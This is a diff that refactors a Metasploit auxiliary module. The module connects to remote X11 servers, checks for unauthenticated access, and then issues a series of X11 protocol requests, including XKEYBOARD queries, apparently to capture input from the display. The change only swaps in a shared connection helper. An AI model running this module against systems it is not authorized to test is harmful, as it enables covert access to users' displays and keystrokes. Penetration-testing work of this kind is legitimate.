@@ -5,8 +5,9 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Exploit::Remote::Tcp
-  include Exploit::Remote::X11
+  include Rex::Proto::X11
   include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::X11::Connect
 
   def initialize(info = {})
     super(
@@ -60,9 +61,13 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status('Establishing TCP Connection')
     connect # tcp connection establish
     vprint_status('Attempting X11 connection')
-    sock.put(X11ConnectionRequest.new.to_binary_s) # x11 session establish
-    connection = process_initial_connection_response(sock.get_once(-1, 1))
-    if connection.success == 1
+    connection = x11_connect
+
+    if connection.nil?
+      return Exploit::CheckCode::Safe('No connection, or bad X11 response received')
+    end
+
+    if connection.header.success == 1
       return Exploit::CheckCode::Appears('Successfully established X11 connection')
     end
 
@@ -159,16 +164,15 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status('Establishing TCP Connection')
     connect # tcp connection establish
     vprint_status('[1/9] Establishing X11 connection')
-    sock.put(X11ConnectionRequest.new.to_binary_s) # x11 session establish
-    data = sock.get_once(-1, 1)
-    fail_with(Msf::Module::Failure::UnexpectedReply, 'Port connected, but no response to X11 connection attempt') if data.nil?
-    connection = process_initial_connection_response(data)
-    if connection.success == 1
-      print_good('Successly established X11 connection')
+    connection = x11_connect
+
+    fail_with(Msf::Module::Failure::UnexpectedReply, 'Port connected, but no response to X11 connection attempt') if connection.nil?
+
+    if connection.header.success == 1
+      print_connection_info(connection, datastore['RHOST'], rport)
     else
-      fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to establish an X11 connection')
+      fail_with(Msf::Module::Failure::UnexpectedReply, 'X11 connection not successful')
     end
-    print_connection_info(connection, datastore['RHOST'], datastore['RPORT'])
 
     vprint_status('[2/9] Checking on BIG-REQUESTS extension')
     sock.put(X11QueryExtensionRequest.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
@@ -180,10 +184,10 @@ class MetasploitModule < Msf::Auxiliary
     sock.get_once(-1, 1)
 
     vprint_status('[4/9] Creating new graphical context')
-    sock.put(X11CreateGraphicalContextRequest.new(cid: connection.resource_id_base,
-                                                  drawable: connection.screen_root,
+    sock.put(X11CreateGraphicalContextRequest.new(cid: connection.body.resource_id_base,
+                                                  drawable: connection.body.screen_root,
                                                   gc_value_mask_background: 1).to_binary_s +
-             X11GetPropertyRequest.new(window: connection.screen_root).to_binary_s) # not sure why we do this
+             X11GetPropertyRequest.new(window: connection.body.screen_root).to_binary_s) # not sure why we do this
     sock.get_once(-1, 1)
 
     vprint_status('[5/9] Checking on XKEYBOARD extension')
@@ -239,7 +243,7 @@ class MetasploitModule < Msf::Auxiliary
       end
     ensure
       vprint_status('Closing X11 connection')
-      sock.put(X11FreeGraphicalContextRequest.new(gc: connection.resource_id_base).to_binary_s +
+      sock.put(X11FreeGraphicalContextRequest.new(gc: connection.body.resource_id_base).to_binary_s +
         X11GetInputFocusRequest.new.to_binary_s)
       disconnect
 
